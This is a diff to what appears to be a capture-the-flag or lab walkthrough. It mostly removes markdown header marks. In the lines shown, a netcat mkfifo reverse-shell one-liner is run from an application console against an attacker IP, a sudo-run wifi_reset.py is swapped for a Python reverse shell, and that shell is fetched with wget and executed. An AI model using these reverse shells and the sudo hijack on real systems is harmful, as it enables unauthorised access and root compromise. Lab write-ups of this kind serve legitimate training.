@@ -176,12 +176,12 @@ There is a Console screen on the system page of the application.
 
 Set up a NC listener and run a reverse shell from the console.
 
-##### Kali:
+Kali:
 ```
 nc -nlvp 31337
 ```
 
-##### Console Screen:
+Console Screen:
 ```
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.49.160 31337 >/tmp/f
 ```
@@ -201,6 +201,11 @@ sudo -l
 
 ![](../Attachments/Pasted%20image%2020211011194422.png)
 
+Moved the current "wifi_reset.py" to "wifi_reset.old".
+```
+mv wifi_reset.py wifi_reset.old
+```
+
 Created a simple python reverse shell named wifi_reset.py using a breakdown. https://medium.com/geekculture/breaking-down-a-python-reverse-shell-one-liner-752041733e5f
 ```
 import socket
@@ -217,24 +222,24 @@ p = subprocess.call(["/bin/bash", "-i"])
 
 Uploaded the shell to target machine
 
-##### Kali:
+Kali:
 ```
 python -m http.server 80
 ```
 
-##### Target:
+Target:
 ```
 wget http://192.168.49.160/wifi_reset.py
 ```
 
 Opened a NC listener on attacking machine and ran the sudo command.
 
-##### Kali:
+Kali:
 ```
 nc -nlvp 1337
 ```
 
-##### Target:
+Target:
 ```
 sudo /usr/bin/python /home/walter/wifi_reset.py
 ```
